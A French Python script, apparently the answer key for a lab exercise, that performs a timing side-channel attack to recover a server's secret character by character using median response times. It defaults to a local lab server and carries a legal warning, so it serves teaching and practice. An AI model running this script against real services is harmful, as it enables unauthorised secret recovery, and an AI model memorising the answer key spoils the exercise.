#!/usr/bin/env python3
"""Corrigé — attaque temporelle (récupération du secret caractère par caractère).

Le serveur compare le secret caractère par caractère et dort à chaque
caractère correct : le temps de réponse fuit la longueur du préfixe correct.
On mesure le temps pour chaque candidat, on prend la médiane sur plusieurs
essais (pour absorber bruit réseau + jitter), et on garde le candidat le plus
lent. On s'arrête dès que le serveur répond 200.

Usage :
    python3 attaque_temporelle_corrige.py --url http://127.0.0.1:8000/check --essais 7
    # Endpoint /check2 (bruit betavariate sur toutes les requêtes) : plus d'essais
    python3 attaque_temporelle_corrige.py --url http://127.0.0.1:8000/check2 --essais 30

Cadre légal : labo isolé uniquement, autorisation écrite hors labo.
Art. 323-1 Code pénal : accès frauduleux = délit, même « juste pour voir ».
"""
import argparse
import statistics
import time

import requests

ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz"
LONGUEUR_MAX = 64


def temps_reponse(url: str, guess: str, timeout: float = 10.0) -> float:
    """Durée (secondes) d'un appel /check?guess=... ; +inf en cas d'erreur."""
    debut = time.perf_counter()
    try:
        requests.get(url, params={"guess": guess}, timeout=timeout)
    except requests.RequestException:
        return float("inf")
    return time.perf_counter() - debut


def temps_median(url: str, guess: str, essais: int) -> float:
    """Médiane des durées sur `essais` requêtes identiques."""
    return statistics.median(temps_reponse(url, guess) for _ in range(essais))


def trouver_secret(url: str, essais: int) -> str:
    """Retrouve le secret : à chaque position, garde le caractère le plus lent."""
    secret = ""
    for _ in range(LONGUEUR_MAX):
        meilleur_caractere = None
        meilleure_duree = -1.0
        for caractere in ALPHABET:
            guess = secret + caractere
            duree = temps_median(url, guess, essais)
            if duree > meilleure_duree:
                meilleure_duree = duree
                meilleur_caractere = caractere
        secret += meilleur_caractere

        reponse = requests.get(url, params={"guess": secret}, timeout=10)
        if reponse.status_code == 200:
            return secret
        print(f"préfixe : {secret!r} ({meilleure_duree * 1000:.1f} ms)")
    return secret


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--url", default="http://127.0.0.1:8000/check")
    p.add_argument("--essais", type=int, default=7,
                   help="nombre de mesures par candidat (médiane)")
    args = p.parse_args()

    debut = time.perf_counter()
    secret = trouver_secret(args.url, args.essais)
    duree = time.perf_counter() - debut

    print(f"\nSecret trouvé : {secret}")
    print(f"Durée totale : {duree:.1f}s ({args.essais} essais/candidat)")


if __name__ == "__main__":
    main()
